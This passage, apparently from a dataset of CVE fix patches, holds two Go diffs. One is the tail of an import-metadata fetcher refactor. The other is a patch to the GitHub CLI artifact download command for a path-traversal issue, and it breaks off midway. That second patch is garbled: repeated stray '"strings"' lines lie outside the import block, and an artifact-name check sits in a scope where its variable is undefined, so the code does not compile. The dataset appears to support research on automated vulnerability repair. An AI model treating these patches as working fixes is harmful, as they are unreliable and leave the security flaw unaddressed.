}\n+        defer resp.Body.Close()\n+        im, sm, redir, err = parseMeta(scheme, importPath, resp.Body)\n+        return scheme, im, sm, redir, err\n }\n \n var refreshToGodocPat = regexp.MustCompile(`(?i)^\\d+; url=https?://godoc\\.org/`)\n \n func parseMeta(scheme, importPath string, r io.Reader) (im *importMeta, sm *sourceMeta, redir bool, err error) {\n-\terrorMessage := \"go-import meta tag not found\"\n+        errorMessage := \"go-import meta tag not found\"\n \n-\td := xml.NewDecoder(r)\n-\td.Strict = false\n+        d := xml.NewDecoder(r)\n+        d.Strict = false\n metaScan:\n-\tfor {\n-\t\tt, tokenErr := d.Token()\n-\t\tif tokenErr != nil {\n-\t\t\tbreak metaScan\n-\t\t}\n-\t\tswitch t := t.(type) {\n-\t\tcase xml.EndElement:\n-\t\t\tif strings.EqualFold(t.Name.Local, \"head\") {\n-\t\t\t\tbreak metaScan\n-\t\t\t}\n-\t\tcase xml.StartElement:\n-\t\t\tif strings.EqualFold(t.Name.Local, \"body\") {\n-\t\t\t\tbreak metaScan\n-\t\t\t}\n-\t\t\tif !strings.EqualFold(t.Name.Local, \"meta\") {\n-\t\t\t\tcontinue metaScan\n-\t\t\t}\n-\t\t\tif strings.EqualFold(attrValue(t.Attr, \"http-equiv\"), \"refresh\") {\n-\t\t\t\t// Check for http-equiv refresh back to godoc.org.\n-\t\t\t\tredir = refreshToGodocPat.MatchString(attrValue(t.Attr, \"content\"))\n-\t\t\t\tcontinue metaScan\n-\t\t\t}\n-\t\t\tnameAttr := attrValue(t.Attr, \"name\")\n-\t\t\tif nameAttr != \"go-import\" && nameAttr != \"go-source\" {\n-\t\t\t\tcontinue metaScan\n-\t\t\t}\n-\t\t\tfields := strings.Fields(attrValue(t.Attr, \"content\"))\n-\t\t\tif len(fields) < 1 {\n-\t\t\t\tcontinue metaScan\n-\t\t\t}\n-\t\t\tprojectRoot := fields[0]\n-\t\t\tif !strings.HasPrefix(importPath, projectRoot) ||\n-\t\t\t\t!(len(importPath) == len(projectRoot) || importPath[len(projectRoot)] == '/') {\n-\t\t\t\t// Ignore if root is not a prefix of the  path. This allows a\n-\t\t\t\t// site to use a single error page for multiple repositories.\n-\t\t\t\tcontinue metaScan\n-\t\t\t}\n-\t\t\tswitch nameAttr {\n-\t\t\tcase \"go-import\":\n-\t\t\t\tif len(fields) != 3 {\n-\t\t\t\t\terrorMessage = \"go-import meta tag content attribute does not have three fields\"\n-\t\t\t\t\tcontinue metaScan\n-\t\t\t\t}\n-\t\t\t\tif fields[1] == \"mod\" {\n-\t\t\t\t\t// vgo adds a special mod vcs type; we can skip this\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t\tif im != nil {\n-\t\t\t\t\tim = nil\n-\t\t\t\t\terrorMessage = \"more than one go-import meta tag found\"\n-\t\t\t\t\tbreak metaScan\n-\t\t\t\t}\n-\t\t\t\tim = &importMeta{\n-\t\t\t\t\tprojectRoot: projectRoot,\n-\t\t\t\t\tvcs:         fields[1],\n-\t\t\t\t\trepo:        fields[2],\n-\t\t\t\t}\n-\t\t\tcase \"go-source\":\n-\t\t\t\tif sm != nil {\n-\t\t\t\t\t// Ignore extra go-source meta tags.\n-\t\t\t\t\tcontinue metaScan\n-\t\t\t\t}\n-\t\t\t\tif len(fields) != 4 {\n-\t\t\t\t\tcontinue metaScan\n-\t\t\t\t}\n-\t\t\t\tsm = &sourceMeta{\n-\t\t\t\t\tprojectRoot:  projectRoot,\n-\t\t\t\t\tprojectURL:   fields[1],\n-\t\t\t\t\tdirTemplate:  fields[2],\n-\t\t\t\t\tfileTemplate: fields[3],\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif im == nil {\n-\t\treturn nil, nil, redir, NotFoundError{Message: fmt.Sprintf(\"%s at %s://%s\", errorMessage, scheme, importPath)}\n-\t}\n-\tif sm != nil && sm.projectRoot != im.projectRoot {\n-\t\tsm = nil\n-\t}\n-\treturn im, sm, redir, nil\n+        for {\n+                t, tokenErr := d.Token()\n+                if tokenErr != nil {\n+                        break metaScan\n+                }\n+                switch t := t.(type) {\n+                case xml.EndElement:\n+                        if strings.EqualFold(t.Name.Local, \"head\") {\n+                                break metaScan\n+                        }\n+                case xml.StartElement:\n+                        if strings.EqualFold(t.Name.Local, \"body\") {\n+                                break metaScan\n+                        }\n+                        if !strings.EqualFold(t.Name.Local, \"meta\") {\n+                                continue metaScan\n+                        }\n+                        if strings.EqualFold(attrValue(t.Attr, \"http-equiv\"), \"refresh\") {\n+                                // Check for http-equiv refresh back to godoc.org.\n+                                redir = refreshToGodocPat.MatchString(attrValue(t.Attr, \"content\"))\n+                                continue metaScan\n+                        }\n+                        nameAttr := attrValue(t.Attr, \"name\")\n+                        if nameAttr != \"go-import\" && nameAttr != \"go-source\" {\n+                                continue metaScan\n+                        }\n+                        fields := strings.Fields(attrValue(t.Attr, \"content\"))\n+                        if len(fields) < 1 {\n+                                continue metaScan\n+                        }\n+                        projectRoot := fields[0]\n+                        if !strings.HasPrefix(importPath, projectRoot) ||\n+                                !(len(importPath) == len(projectRoot) || importPath[len(projectRoot)] == '/') {\n+                                // Ignore if root is not a prefix of the  path. This allows a\n+                                // site to use a single error page for multiple repositories.\n+                                continue metaScan\n+                        }\n+                        switch nameAttr {\n+                        case \"go-import\":\n+                                if len(fields) != 3 {\n+                                        errorMessage = \"go-import meta tag content attribute does not have three fields\"\n+                                        continue metaScan\n+                                }\n+                                if fields[1] == \"mod\" {\n+                                        // vgo adds a special mod vcs type; we can skip this\n+                                        continue\n+                                }\n+                                if im != nil {\n+                                        im = nil\n+                                        errorMessage = \"more than one go-import meta tag found\"\n+                                        break metaScan\n+                                }\n+                                im = &importMeta{\n+                                        projectRoot: projectRoot,\n+                                        vcs:         fields[1],\n+                                        repo:        fields[2],\n+                                }\n+                        case \"go-source\":\n+                                if sm != nil {\n+                                        // Ignore extra go-source meta tags.\n+                                        continue metaScan\n+                                }\n+                                if len(fields) != 4 {\n+                                        continue metaScan\n+                                }\n+                                sm = &sourceMeta{\n+                                        projectRoot:  projectRoot,\n+                                        projectURL:   fields[1],\n+                                        dirTemplate:  fields[2],\n+                                        fileTemplate: fields[3],\n+                                }\n+                        }\n+                }\n+        }\n+        if im == nil {\n+                return nil, nil, redir, NotFoundError{Message: fmt.Sprintf(\"%s at %s://%s\", errorMessage, scheme, importPath)}\n+        }\n+        if sm != nil && sm.projectRoot != im.projectRoot {\n+                sm = nil\n+        }\n+        return im, sm, redir, nil\n }\n \n // getVCSDirFn is called by getDynamic to fetch source using VCS commands. The\n // default value here does nothing. If the code is not built for App Engine,\n // then getVCSDirFn is set getVCSDir, the function that actually does the work.\n var getVCSDirFn = func(ctx context.Context, client *http.Client, m map[string]string, etag string) (*Directory, error) {\n-\treturn nil, errNoMatch\n+        return nil, errNoMatch\n }\n \n // getDynamic gets a directory from a service that is not statically known.\n func getDynamic(ctx context.Context, client *http.Client, importPath, etag string) (*Directory, error) {\n-\tmetaProto, im, sm, redir, err := fetchMeta(ctx, client, importPath)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif im.projectRoot != importPath {\n-\t\tvar imRoot *importMeta\n-\t\tmetaProto, imRoot, _, redir, err = fetchMeta(ctx, client, im.projectRoot)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tif *imRoot != *im {\n-\t\t\treturn nil, NotFoundError{Message: \"project root mismatch.\"}\n-\t\t}\n-\t}\n-\n-\t// clonePath is the repo URL from import meta tag, with the \"scheme://\" prefix removed.\n-\t// It should be used for cloning repositories.\n-\t// repo is the repo URL from import meta tag, with the \"scheme://\" prefix removed, and\n-\t// a possible \".vcs\" suffix trimmed.\n-\ti := strings.Index(im.repo, \"://\")\n-\tif i < 0 {\n-\t\treturn nil, NotFoundError{Message: \"bad repo URL: \" + im.repo}\n-\t}\n-\tproto := im.repo[:i]\n-\tclonePath := im.repo[i+len(\"://\"):]\n-\trepo := strings.TrimSuffix(clonePath, \".\"+im.vcs)\n-\tdirName := importPath[len(im.projectRoot):]\n-\n-\tresolvedPath := repo + dirName\n-\tdir, err := getStatic(ctx, client, resolvedPath, etag)\n-\tif err == errNoMatch {\n-\t\tresolvedPath = repo + \".\" + im.vcs + dirName\n-\t\tmatch := map[string]string{\n-\t\t\t\"dir\":        dirName,\n-\t\t\t\"importPath\": importPath,\n-\t\t\t\"clonePath\":  clonePath,\n-\t\t\t\"repo\":       repo,\n-\t\t\t\"scheme\":     proto,\n-\t\t\t\"vcs\":        im.vcs,\n-\t\t}\n-\t\tdir, err = getVCSDirFn(ctx, client, match, etag)\n-\t}\n-\tif err != nil || dir == nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tdir.ImportPath = importPath\n-\tdir.ProjectRoot = im.projectRoot\n-\tdir.ResolvedPath = resolvedPath\n-\tdir.ProjectName = path.Base(im.projectRoot)\n-\tif !redir {\n-\t\tdir.ProjectURL = metaProto + \"://\" + im.projectRoot\n-\t}\n-\n-\tif sm == nil {\n-\t\treturn dir, nil\n-\t}\n-\n-\tif isHTTPURL(sm.projectURL) {\n-\t\tdir.ProjectURL = sm.projectURL\n-\t}\n-\n-\tif isHTTPURL(sm.dirTemplate) {\n-\t\tdir.BrowseURL = replaceDir(sm.dirTemplate, dirName)\n-\t}\n-\n-\t// TODO: Refactor this to be simpler, implement the go-source meta tag spec fully.\n-\tif isHTTPURL(sm.fileTemplate) {\n-\t\tfileTemplate := replaceDir(sm.fileTemplate, dirName)\n-\t\tif strings.Contains(fileTemplate, \"{file}\") {\n-\t\t\tcut := strings.LastIndex(fileTemplate, \"{file}\") + len(\"{file}\") // Cut point is right after last {file} section.\n-\t\t\tswitch hash := strings.Index(fileTemplate, \"#\"); {\n-\t\t\tcase hash == -1: // If there's no '#', place cut at the end.\n-\t\t\t\tcut = len(fileTemplate)\n-\t\t\tcase hash > cut: // If a '#' comes after last {file}, use it as cut point.\n-\t\t\t\tcut = hash\n-\t\t\t}\n-\t\t\thead, tail := fileTemplate[:cut], fileTemplate[cut:]\n-\t\t\tfor _, f := range dir.Files {\n-\t\t\t\tf.BrowseURL = strings.Replace(head, \"{file}\", f.Name, -1)\n-\t\t\t}\n-\n-\t\t\tif strings.Contains(tail, \"{line}\") {\n-\t\t\t\ts := strings.Replace(tail, \"%\", \"%%\", -1)\n-\t\t\t\ts = strings.Replace(s, \"{line}\", \"%d\", 1)\n-\t\t\t\tdir.LineFmt = \"%s\" + s\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn dir, nil\n+        metaProto, im, sm, redir, err := fetchMeta(ctx, client, importPath)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        if im.projectRoot != importPath {\n+                var imRoot *importMeta\n+                metaProto, imRoot, _, redir, err = fetchMeta(ctx, client, im.projectRoot)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                if *imRoot != *im {\n+                        return nil, NotFoundError{Message: \"project root mismatch.\"}\n+                }\n+        }\n+\n+        // clonePath is the repo URL from import meta tag, with the \"scheme://\" prefix removed.\n+        // It should be used for cloning repositories.\n+        // repo is the repo URL from import meta tag, with the \"scheme://\" prefix removed, and\n+        // a possible \".vcs\" suffix trimmed.\n+        i := strings.Index(im.repo, \"://\")\n+        if i < 0 {\n+                return nil, NotFoundError{Message: \"bad repo URL: \" + im.repo}\n+        }\n+        proto := im.repo[:i]\n+        clonePath := im.repo[i+len(\"://\"):]\n+        repo := strings.TrimSuffix(clonePath, \".\"+im.vcs)\n+        dirName := path.Clean(importPath[len(im.projectRoot):])\n+\n+        resolvedPath := repo + dirName\n+        dir, err := getStatic(ctx, client, resolvedPath, etag)\n+        if err == errNoMatch {\n+                resolvedPath = repo + \".\" + im.vcs + dirName\n+                match := map[string]string{\n+                        \"dir\":        dirName,\n+                        \"importPath\": importPath,\n+                        \"clonePath\":  clonePath,\n+                        \"repo\":       repo,\n+                        \"scheme\":     proto,\n+                        \"vcs\":        im.vcs,\n+                }\n+                dir, err = getVCSDirFn(ctx, client, match, etag)\n+        }\n+        if err != nil || dir == nil {\n+                return nil, err\n+        }\n+\n+        dir.ImportPath = importPath\n+        dir.ProjectRoot = im.projectRoot\n+        dir.ResolvedPath = resolvedPath\n+        dir.ProjectName = path.Base(im.projectRoot)\n+        if !redir {\n+                dir.ProjectURL = metaProto + \"://\" + im.projectRoot\n+        }\n+\n+        if sm == nil {\n+                return dir, nil\n+        }\n+\n+        if isHTTPURL(sm.projectURL) {\n+                dir.ProjectURL = sm.projectURL\n+        }\n+\n+        if isHTTPURL(sm.dirTemplate) {\n+                dir.BrowseURL = replaceDir(sm.dirTemplate, dirName)\n+        }\n+\n+        // TODO: Refactor this to be simpler, implement the go-source meta tag spec fully.\n+        if isHTTPURL(sm.fileTemplate) {\n+                fileTemplate := replaceDir(sm.fileTemplate, dirName)\n+                if strings.Contains(fileTemplate, \"{file}\") {\n+                        cut := strings.LastIndex(fileTemplate, \"{file}\") + len(\"{file}\") // Cut point is right after last {file} section.\n+                        switch hash := strings.Index(fileTemplate, \"#\"); {\n+                        case hash == -1: // If there's no '#', place cut at the end.\n+                                cut = len(fileTemplate)\n+                        case hash > cut: // If a '#' comes after last {file}, use it as cut point.\n+                                cut = hash\n+                        }\n+                        head, tail := fileTemplate[:cut], fileTemplate[cut:]\n+                        for _, f := range dir.Files {\n+                                f.BrowseURL = strings.Replace(head, \"{file}\", f.Name, -1)\n+                        }\n+\n+                        if strings.Contains(tail, \"{line}\") {\n+                                s := strings.Replace(tail, \"%\", \"%%\", -1)\n+                                s = strings.Replace(s, \"{line}\", \"%d\", 1)\n+                                dir.LineFmt = \"%s\" + s\n+                        }\n+                }\n+        }\n+\n+        return dir, nil\n }\n \n // getStatic gets a diretory from a statically known service. getStatic\n // returns errNoMatch if the import path is not recognized.\n func getStatic(ctx context.Context, client *http.Client, importPath, etag string) (*Directory, error) {\n-\tfor _, s := range services {\n-\t\tif s.get == nil {\n-\t\t\tcontinue\n-\t\t}\n-\t\tmatch, err := s.match(importPath)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tif match != nil {\n-\t\t\tdir, err := s.get(ctx, client, match, etag)\n-\t\t\tif dir != nil {\n-\t\t\t\tdir.ImportPath = importPath\n-\t\t\t\tdir.ResolvedPath = importPath\n-\t\t\t}\n-\t\t\treturn dir, err\n-\t\t}\n-\t}\n-\treturn nil, errNoMatch\n+        for _, s := range services {\n+                if s.get == nil {\n+                        continue\n+                }\n+                match, err := s.match(importPath)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                if match != nil {\n+                        dir, err := s.get(ctx, client, match, etag)\n+                        if dir != nil {\n+                                dir.ImportPath = importPath\n+                                dir.ResolvedPath = importPath\n+                        }\n+                        return dir, err\n+                }\n+        }\n+        return nil, errNoMatch\n }\n \n func Get(ctx context.Context, client *http.Client, importPath string, etag string) (dir *Directory, err error) {\n-\tswitch {\n-\tcase localPath != \"\":\n-\t\tdir, err = getLocal(importPath)\n-\tcase IsGoRepoPath(importPath):\n-\t\tdir, err = getStandardDir(ctx, client, importPath, etag)\n-\tcase IsValidRemotePath(importPath):\n-\t\tdir, err = getStatic(ctx, client, importPath, etag)\n-\t\tif err == errNoMatch {\n-\t\t\tdir, err = getDynamic(ctx, client, importPath, etag)\n-\t\t}\n-\tdefault:\n-\t\terr = errNoMatch\n-\t}\n-\n-\tif err == errNoMatch {\n-\t\terr = NotFoundError{Message: \"Import path not valid:\"}\n-\t}\n-\n-\treturn dir, err\n+        switch {\n+        case localPath != \"\":\n+                dir, err = getLocal(importPath)\n+        case IsGoRepoPath(importPath):\n+                dir, err = getStandardDir(ctx, client, importPath, etag)\n+        case IsValidRemotePath(importPath):\n+                dir, err = getStatic(ctx, client, importPath, etag)\n+                if err == errNoMatch {\n+                        dir, err = getDynamic(ctx, client, importPath, etag)\n+                }\n+        default:\n+                err = errNoMatch\n+        }\n+\n+        if err == errNoMatch {\n+                err = NotFoundError{Message: \"Import path not valid:\"}\n+        }\n+\n+        return dir, err\n }\n \n // GetPresentation gets a presentation from the the given path.\n func GetPresentation(ctx context.Context, client *http.Client, importPath string) (*Presentation, error) {\n-\text := path.Ext(importPath)\n-\tif ext != \".slide\" && ext != \".article\" {\n-\t\treturn nil, NotFoundError{Message: \"unknown file extension.\"}\n-\t}\n-\n-\timportPath, file := path.Split(importPath)\n-\timportPath = strings.TrimSuffix(importPath, \"/\")\n-\tfor _, s := range services {\n-\t\tif s.getPresentation == nil {\n-\t\t\tcontinue\n-\t\t}\n-\t\tmatch, err := s.match(importPath)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tif match != nil {\n-\t\t\tmatch[\"file\"] = file\n-\t\t\treturn s.getPresentation(ctx, client, match)\n-\t\t}\n-\t}\n-\treturn nil, NotFoundError{Message: \"path does not match registered service\"}\n+        ext := path.Ext(importPath)\n+        if ext != \".slide\" && ext != \".article\" {\n+                return nil, NotFoundError{Message: \"unknown file extension.\"}\n+        }\n+\n+        importPath, file := path.Split(importPath)\n+        importPath = strings.TrimSuffix(importPath, \"/\")\n+        for _, s := range services {\n+                if s.getPresentation == nil {\n+                        continue\n+                }\n+                match, err := s.match(importPath)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                if match != nil {\n+                        match[\"file\"] = file\n+                        return s.getPresentation(ctx, client, match)\n+                }\n+        }\n+        return nil, NotFoundError{Message: \"path does not match registered service\"}\n }\n \n // GetProject gets information about a repository.\n func GetProject(ctx context.Context, client *http.Client, importPath string) (*Project, error) {\n-\tfor _, s := range services {\n-\t\tif s.getProject == nil {\n-\t\t\tcontinue\n-\t\t}\n-\t\tmatch, err := s.match(importPath)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tif match != nil {\n-\t\t\treturn s.getProject(ctx, client, match)\n-\t\t}\n-\t}\n-\treturn nil, NotFoundError{Message: \"path does not match registered service\"}\n+        for _, s := range services {\n+                if s.getProject == nil {\n+                        continue\n+                }\n+                match, err := s.match(importPath)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                if match != nil {\n+                        return s.getProject(ctx, client, match)\n+                }\n+        }\n+        return nil, NotFoundError{Message: \"path does not match registered service\"}\n }\n"}
{"cve":"CVE-2024-54132:0708", "fix_patch": "diff --git a/pkg/cmd/run/download/download.go b/pkg/cmd/run/download/download.go\nindex 99ec45bbe..8834d62d1 100644\n--- a/pkg/cmd/run/download/download.go\n+++ b/pkg/cmd/run/download/download.go\n@@ -1,202 +1,257 @@\n package download\n \n import (\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"path/filepath\"\n-\n-\t\"github.com/MakeNowJust/heredoc\"\n-\t\"github.com/cli/cli/v2/pkg/cmd/run/shared\"\n-\t\"github.com/cli/cli/v2/pkg/cmdutil\"\n-\t\"github.com/cli/cli/v2/pkg/iostreams\"\n-\t\"github.com/cli/cli/v2/pkg/set\"\n-\t\"github.com/spf13/cobra\"\n+\"strings\"\n+)\n+\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\n+import (\n+        \"errors\"\n+        \"fmt\"\n+        \"path/filepath\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\"strings\"\n+\n+        \"github.com/MakeNowJust/heredoc\"\n+        \"github.com/cli/cli/v2/pkg/cmd/run/shared\"\n+        \"github.com/cli/cli/v2/pkg/cmdutil\"\n+        \"github.com/cli/cli/v2/pkg/iostreams\"\n+        \"github.com/cli/cli/v2/pkg/set\"\n+        \"github.com/spf13/cobra\"\n )\n \n type DownloadOptions struct {\n-\tIO       *iostreams.IOStreams\n-\tPlatform platform\n-\tPrompter iprompter\n-\n-\tDoPrompt       bool\n-\tRunID          string\n-\tDestinationDir string\n-\tNames          []string\n-\tFilePatterns   []string\n+        IO       *iostreams.IOStreams\n+        Platform platform\n+        Prompter iprompter\n+\n+        DoPrompt       bool\n+        RunID          string\n+        DestinationDir string\n+        Names          []string\n+        FilePatterns   []string\n }\n \n type platform interface {\n-\tList(runID string) ([]shared.Artifact, error)\n-\tDownload(url string, dir string) error\n+        List(runID string) ([]shared.Artifact, error)\n+        Download(url string, dir string) error\n }\n type iprompter interface {\n-\tMultiSelect(string, []string, []string) ([]int, error)\n+        MultiSelect(string, []string, []string) ([]int, error)\n }\n \n func NewCmdDownload(f *cmdutil.Factory, runF func(*DownloadOptions) error) *cobra.Command {\n-\topts := &DownloadOptions{\n-\t\tIO:       f.IOStreams,\n-\t\tPrompter: f.Prompter,\n-\t}\n-\n-\tcmd := &cobra.Command{\n-\t\tUse:   \"download [<run-id>]\",\n-\t\tShort: \"Download artifacts generated by a workflow run\",\n-\t\tLong: heredoc.Docf(`\n-\t\t\tDownload artifacts generated by a GitHub Actions workflow run.\n-\n-\t\t\tThe contents of each artifact will be extracted under separate directories based on\n-\t\t\tthe artifact name. If only a single artifact is specified, it will be extracted into\n-\t\t\tthe current directory.\n-\n-\t\t\tBy default, this command downloads the latest artifact created and uploaded through\n-\t\t\tGitHub Actions. Because workflows can delete or overwrite artifacts, %[1]s<run-id>%[1]s\n-\t\t\tmust be used to select an artifact from a specific workflow run.\n-\t\t`, \"`\"),\n-\t\tArgs: cobra.MaximumNArgs(1),\n-\t\tExample: heredoc.Doc(`\n-\t\t\t# Download all artifacts generated by a workflow run\n-\t\t\t$ gh run download <run-id>\n-\n-\t\t\t# Download a specific artifact within a run\n-\t\t\t$ gh run download <run-id> -n <name>\n-\n-\t\t\t# Download specific artifacts across all runs in a repository\n-\t\t\t$ gh run download -n <name1> -n <name2>\n-\n-\t\t\t# Select artifacts to download interactively\n-\t\t\t$ gh run download\n-\t\t`),\n-\t\tRunE: func(cmd *cobra.Command, args []string) error {\n-\t\t\tif len(args) > 0 {\n-\t\t\t\topts.RunID = args[0]\n-\t\t\t} else if len(opts.Names) == 0 &&\n-\t\t\t\tlen(opts.FilePatterns) == 0 &&\n-\t\t\t\topts.IO.CanPrompt() {\n-\t\t\t\topts.DoPrompt = true\n-\t\t\t}\n-\t\t\t// support `-R, --repo` override\n-\t\t\tbaseRepo, err := f.BaseRepo()\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\thttpClient, err := f.HttpClient()\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\topts.Platform = &apiPlatform{\n-\t\t\t\tclient: httpClient,\n-\t\t\t\trepo:   baseRepo,\n-\t\t\t}\n-\n-\t\t\tif runF != nil {\n-\t\t\t\treturn runF(opts)\n-\t\t\t}\n-\t\t\treturn runDownload(opts)\n-\t\t},\n-\t}\n-\n-\tcmd.Flags().StringVarP(&opts.DestinationDir, \"dir\", \"D\", \".\", \"The directory to download artifacts into\")\n-\tcmd.Flags().StringArrayVarP(&opts.Names, \"name\", \"n\", nil, \"Download artifacts that match any of the given names\")\n-\tcmd.Flags().StringArrayVarP(&opts.FilePatterns, \"pattern\", \"p\", nil, \"Download artifacts that match a glob pattern\")\n-\n-\treturn cmd\n+        opts := &DownloadOptions{\n+                IO:       f.IOStreams,\n+                Prompter: f.Prompter,\n+        }\n+\n+        cmd := &cobra.Command{\n+                Use:   \"download [<run-id>]\",\n+                Short: \"Download artifacts generated by a workflow run\",\n+                Long: heredoc.Docf(`\n+                        Download artifacts generated by a GitHub Actions workflow run.\n+\n+                        The contents of each artifact will be extracted under separate directories based on\n+                        the artifact name. If only a single artifact is specified, it will be extracted into\n+                        the current directory.\n+\n+                        By default, this command downloads the latest artifact created and uploaded through\n+                        GitHub Actions. Because workflows can delete or overwrite artifacts, %[1]s<run-id>%[1]s\n+                        must be used to select an artifact from a specific workflow run.\n+                `, \"`\"),\n+                Args: cobra.MaximumNArgs(1),\n+                Example: heredoc.Doc(`\n+                        # Download all artifacts generated by a workflow run\n+                        $ gh run download <run-id>\n+\n+                        # Download a specific artifact within a run\n+                        $ gh run download <run-id> -n <name>\n+\n+                        # Download specific artifacts across all runs in a repository\n+                        $ gh run download -n <name1> -n <name2>\n+\n+                        # Select artifacts to download interactively\n+                        $ gh run download\n+                `),\n+                RunE: func(cmd *cobra.Command, args []string) error {\n+                        if len(args) > 0 {\n+                                opts.RunID = args[0]\n+                        } else if len(opts.Names) == 0 &&\n+                                len(opts.FilePatterns) == 0 &&\n+                                opts.IO.CanPrompt() {\n+                                opts.DoPrompt = true\n+                        }\n+                        // support `-R, --repo` override\n+                        baseRepo, err := f.BaseRepo()\n+                        if err != nil {\n+                                return err\n+                        }\n+                        httpClient, err := f.HttpClient()\n+                        if err != nil {\n+                                return err\n+                        }\n+                        opts.Platform = &apiPlatform{\n+                                client: httpClient,\n+                                repo:   baseRepo,\n+                        }\n+\n+                        if runF != nil {\n+                                return runF(opts)\n+                        }\n+                        return runDownload(opts)\n+                },\n+        }\n+\n+        cmd.Flags().StringVarP(&opts.DestinationDir, \"dir\", \"D\", \".\", \"The directory to download artifacts into\")\n+        cmd.Flags().StringArrayVarP(&opts.Names, \"name\", \"n\", nil, \"Download artifacts that match any of the given names\")\n+        cmd.Flags().StringArrayVarP(&opts.FilePatterns, \"pattern\", \"p\", nil, \"Download artifacts that match a glob pattern\")\n+\n+        return cmd\n }\n \n func runDownload(opts *DownloadOptions) error {\n-\topts.IO.StartProgressIndicator()\n-\tartifacts, err := opts.Platform.List(opts.RunID)\n-\topts.IO.StopProgressIndicator()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error fetching artifacts: %w\", err)\n-\t}\n-\n-\tnumValidArtifacts := 0\n-\tfor _, a := range artifacts {\n-\t\tif a.Expired {\n-\t\t\tcontinue\n-\t\t}\n-\t\tnumValidArtifacts++\n-\t}\n-\tif numValidArtifacts == 0 {\n-\t\treturn errors.New(\"no valid artifacts found to download\")\n-\t}\n-\n-\twantPatterns := opts.FilePatterns\n-\twantNames := opts.Names\n-\tif opts.DoPrompt {\n-\t\tartifactNames := set.NewStringSet()\n-\t\tfor _, a := range artifacts {\n-\t\t\tif !a.Expired {\n-\t\t\t\tartifactNames.Add(a.Name)\n-\t\t\t}\n-\t\t}\n-\t\toptions := artifactNames.ToSlice()\n-\t\tif len(options) > 10 {\n-\t\t\toptions = options[:10]\n-\t\t}\n-\t\tvar selected []int\n-\t\tif selected, err = opts.Prompter.MultiSelect(\"Select artifacts to download:\", nil, options); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\twantNames = []string{}\n-\t\tfor _, x := range selected {\n-\t\t\twantNames = append(wantNames, options[x])\n-\t\t}\n-\t\tif len(wantNames) == 0 {\n-\t\t\treturn errors.New(\"no artifacts selected\")\n-\t\t}\n-\t}\n-\n-\topts.IO.StartProgressIndicator()\n-\tdefer opts.IO.StopProgressIndicator()\n-\n-\t// track downloaded artifacts and avoid re-downloading any of the same name\n-\tdownloaded := set.NewStringSet()\n-\tfor _, a := range artifacts {\n-\t\tif a.Expired {\n-\t\t\tcontinue\n-\t\t}\n-\t\tif downloaded.Contains(a.Name) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tif len(wantNames) > 0 || len(wantPatterns) > 0 {\n-\t\t\tif !matchAnyName(wantNames, a.Name) && !matchAnyPattern(wantPatterns, a.Name) {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\tdestDir := opts.DestinationDir\n-\t\tif len(wantPatterns) != 0 || len(wantNames) != 1 {\n-\t\t\tdestDir = filepath.Join(destDir, a.Name)\n-\t\t}\n-\t\terr := opts.Platform.Download(a.DownloadURL, destDir)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error downloading %s: %w\", a.Name, err)\n-\t\t}\n-\t\tdownloaded.Add(a.Name)\n-\t}\n-\n-\tif downloaded.Len() == 0 {\n-\t\treturn errors.New(\"no artifact matches any of the names or patterns provided\")\n-\t}\n-\n-\treturn nil\n+        opts.IO.StartProgressIndicator()\n+        artifacts, err := opts.Platform.List(opts.RunID)\n+        opts.IO.StopProgressIndicator()\n+        if err != nil {\n+                return fmt.Errorf(\"error fetching artifacts: %w\", err)\n+        }\n+\n+        numValidArtifacts := 0\n+        for _, a := range artifacts {\n+                if a.Expired {\n+                        continue\n+                }\n+                numValidArtifacts++\n+        }\n+        if numValidArtifacts == 0 {\n+                return errors.New(\"no valid artifacts found to download\")\n+        }\n+\n+        wantPatterns := opts.FilePatterns\n+        wantNames := opts.Names\n+        if opts.DoPrompt {\n+                artifactNames := set.NewStringSet()\n+                for _, a := range artifacts {\n+                        if !a.Expired {\n+                                artifactNames.Add(a.Name)\n+                        }\n+                }\n+                options := artifactNames.ToSlice()\n+if a.Name == \".\" || a.Name == \"..\" || strings.ContainsAny(a.Name, \"/\\\\\") {\n+if opts.IO.IsStderrTTY() {\n+fmt.Fprintf(opts.IO.ErrOut, \"warning: skipping artifact %q with invalid name\\n\", a.Name)\n+}\n+continue\n+}\n+                if len(options) > 10 {\n+                        options = options[:10]\n+                }\n+                var selected []int\n+                if selected, err = opts.Prompter.MultiSelect(\"Select artifacts to download:\", nil, options); err != nil {\n+                        return err\n+                }\n+                wantNames = []string{}\n+                for _, x := range selected {\n+                        wantNames = append(wantNames, options[x])\n+                }\n+                if len(wantNames) == 0 {\n+                        return errors.New(\"no artifacts selected\")\n+                }\n+        }\n+\n+        